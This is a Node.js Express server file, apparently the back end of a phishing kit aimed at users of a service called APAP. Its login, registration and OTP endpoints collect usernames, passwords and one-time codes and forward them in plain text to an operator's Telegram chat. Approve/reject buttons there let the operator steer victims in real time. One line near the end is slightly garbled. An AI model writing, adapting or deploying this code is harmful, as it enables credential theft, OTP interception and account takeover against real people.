const express = require('express');
const bodyParser = require('body-parser');
const axios = require('axios');
const dotenv = require('dotenv');
const path = require('path');
const cors = require('cors');

// Cargar variables de entorno
dotenv.config();

const app = express();
const PORT = process.env.PORT || 3000;
const VERCEL_URL = process.env.VERCEL_URL || '';
const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN;
const CHAT_ID = process.env.CHAT_ID;
const TELEGRAM_API_BASE = `https://api.telegram.org/bot${TELEGRAM_TOKEN}`;

if (!TELEGRAM_TOKEN || !CHAT_ID) {
    throw new Error("TELEGRAM_TOKEN y CHAT_ID deben estar configurados en las variables de entorno");
}

// Middleware
app.use(bodyParser.json());
app.use(express.static(path.join(__dirname, 'public')));
app.use(cors({ origin: '*' }));

// Estado en memoria (en producción usar base de datos)
const estados = {};

// Funciones de ayuda
async function enviarMensajeTelegram(chatId, texto, teclado = null) {
    try {
        const payload = {
            chat_id: chatId,
            text: texto,
            parse_mode: 'Markdown',
        };
        if (teclado) {
            payload.reply_markup = JSON.stringify(teclado);
        }
        const response = await axios.post(`${TELEGRAM_API_BASE}/sendMessage`, payload);
        return response.data;
    } catch (error) {
        console.error('Error enviando mensaje a Telegram:', error);
        return null;
    }
}

async function eliminarMensajeTelegram(chatId, messageId) {
    try {
        await axios.post(`${TELEGRAM_API_BASE}/deleteMessage`, {
            chat_id: chatId,
            message_id: messageId
        });
    } catch (error) {
        console.error('Error eliminando mensaje de Telegram:', error);
    }
}

// Endpoints
app.post('/api/apap_login', async (req, res) => {
    const { usuario, password } = req.body;
    if (!usuario || !password) {
        return res.status(400).json({ status: 'error', message: 'Usuario y contraseña son requeridos' });
    }

    // Generar ID único para este mensaje
    const messageId = `login_${Date.now()}`;
    
    estados[usuario] = {
        password,
        decision: null,
        tipo: 'login',
        msg_ids: { login: messageId },
        timestamp: Date.now()
    };

    const texto = `🔐 *INICIO DE SESIÓN*\n\n👤 Usuario: \`${usuario}\`\n🔑 Contraseña: \`${password}\``;
    
    const teclado = {
        inline_keyboard: [
            [{ text: '✅ Aprobar', callback_data: `${usuario}|approve|login|${messageId}` }],
            [{ text: '❌ Rechazar', callback_data: `${usuario}|reject|login|${messageId}` }]
        ]
    };

    await enviarMensajeTelegram(CHAT_ID, texto, teclado);
    res.json({ status: 'ok', message: 'Solicitud de inicio de sesión enviada' });
});

app.post('/api/apap_registro', async (req, res) => {
    const { usuario, password, canal, canal_texto } = req.body;
    
    if (!usuario || !password || !canal || !canal_texto) {
        return res.status(400).json({ 
            status: 'error', 
            message: 'Todos los campos son requeridos' 
        });
    }

    const messageId = `reg_${Date.now()}`;
    
    estados[usuario] = {
        ...estados[usuario],
        password,
        canal,
        canal_texto,
        decision: null,
        tipo: 'registro',
        msg_ids: { ...(estados[usuario]?.msg_ids || {}), registro: messageId },
        timestamp: Date.now()
    };

    const texto = `📝 *NUEVO REGISTRO*\n\n👤 Usuario: \`${usuario}\`\n🔑 Contraseña: \`${password}\`\n📱 Canal: ${canal_texto} (${canal})`;
    
    const teclado = {
        inline_keyboard: [
            [{ text: '✅ Aprobar', callback_data: `${usuario}|approve|registro|${messageId}` }],
            [{ text: '❌ Rechazar', callback_data: `${usuario}|reject|registro|${messageId}` }]
        ]
    };

    await enviarMensajeTelegram(CHAT_ID, texto, teclado);
    res.json({ status: 'ok', message: 'Solicitud de registro enviada' });
});

app.post('/api/apap_otp', async (req, res) => {
    const { usuario, codigo_otp } = req.body;
    
    if (!usuario || !codigo_otp) {
        return res.status(400).json({ 
            status: 'error', 
            message: 'Usuario y código OTP son requeridos' 
        });
    }

    const userState = estados[usuario];
    if (!userState) {
        return res.status(404).json({ 
            status: 'error', 
            message: 'Usuario no encontrado' 
        });
    }

    const messageId = `otp_${Date.now()}`;
    
    estados[usuario] = {
        ...userState,
        otp: codigo_otp,
        decision: null,
        tipo: 'otp',
        msg_ids: { ...(userState.msg_ids || {}), otp: messageId },
        timestamp: Date.now()
    };

    const texto = `🔢 *CÓDIGO OTP*\n\n👤 Usuario: \`${usuario}\`\n🔢 Código: \`${codigo_otp}\``;
    
    const teclado = {
        inline_keyboard: [
            [{ text: '✅ Verificado', callback_data: `${usuario}|approve|otp|${messageId}` }],
            [{ text: '❌ Incorrecto', callback_data: `${usuario}|reject|otp|${messageId}` }]
        ]
    };

    await enviarMensajeTelegram(CHAT_ID, texto, teclado);
    res.json({ status: 'ok', message: 'Código OTP enviado para verificación' });
});

app.post('/api/apap_resend', async (req, res) => {
    const { usuario, nota } = req.body;
    
    if (!usuario) {
        return res.status(400).json({ 
            status: 'error', 
            message: 'Usuario es requerido' 
        });
    }

    const userState = estados[usuario];
    if (!userState) {
        return res.status(404).json({ 
            status: 'error', 
            message: 'Usuario no encontrado' 
        });
    }

    const texto = `🔄 *SOLICITUD DE REENVÍO*\n\n👤 Usuario: \`${usuario}\`\n📝 Nota: ${nota || 'Sin detalles adicionales'}`;
    
    await enviarMensajeTelegram(CHAT_ID, texto);
    res.json({ status: 'ok', message: 'Solicitud de reenvío recibida' });
});

// Webhook para actualizaciones de Telegram
app.post(`/webhook/${TELEGRAM_TOKEN}`, async (req, res) => {
    const update = req.body;
    
    // Manejar callbacks de botones
    if (update.callback_query) {
        const { data, message } = update.callback_query;
        const [usuario, accion, tipo, messageId] = data.split('|');
        
        if (!estados[usuario]) {
            return res.status(200).send();
        }

        // Actualizar estado
        estados[usuario].decision = accion === 'approve' ? 'aprobado' : 'rechazado';
        estados[usuario].tipo = tipo;
        estados[usuario].timestamp = Date.now();

        // Eliminar mensaje original
        if (message?.message_id) {
            await eliminarMensajeTelegram(message.chat.id, message.message_id);
        }

        // Enviar confirmación
        const texto = accion === 'approve' 
            ? `✅ *${usuario.toUpperCase()}* - ${tipo.toUpperCase()} APROBADO`
            : `❌ *${usuario.toUpperCase()}* - ${tipo.toUpperCase()} RECHAZADO`;
            
        await enviarMensajeTelegram(CHAT_ID, texto);
    }
    
    res.status(200).send();
});

// Configurar webhook de Telegram
async function configurarWebhook() {
    try {
        const webhookUrl = `${VERCEL_URL}/webhook/${TELEGRAM_TOKEN}`;
        const response = await axios.get(
            `${TELEGRAM_API_BASE}/setWebhook?url=${encodeURIComponent(webhookUrl)}`
        );
        console.log('Webhook configurado:', response.data);
    } catch (error) {
        console.error('Error configurando webhook:', error.message);
    }
}

// Ruta para verificar el estado de un usuario
app.get('/api/estado/:usuario', (req, res) => {
    const { usuario } = req.params;
    const estado = estados[usuario];
    
    if (!estado) {
        return res.status(404).json({ 
            status: 'error', 
            message: 'Usuario no encontrado' 
        });
    }
    
    res.json({ 
        status: 'ok', 
        data: {
            usuario,
            tipo: estado.tipo,
            decision: estado.decision,
            timestamp: estado.timestamp
        }
    });
});

// Servir archivos estáticos
app.get('*', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// Iniciar servidor
const server = app.listen(PORT, async () => {
    console.log(`Servidor ejecutándose en el puerto ${PORT}`);
    if (VERCEL_URL) {
        await configurarWebhook();
        console.log(`URL de Vercel: ${VERCEL_URL}`);
    }
});

// Manejo de errores
process.on('unhandledRejection', (reason, promise) => {
    console.error('Unhandled Rejection at:', promise, 'reason:', reason);n});

// Exportar la aplicación para Vercel
module.exports = app;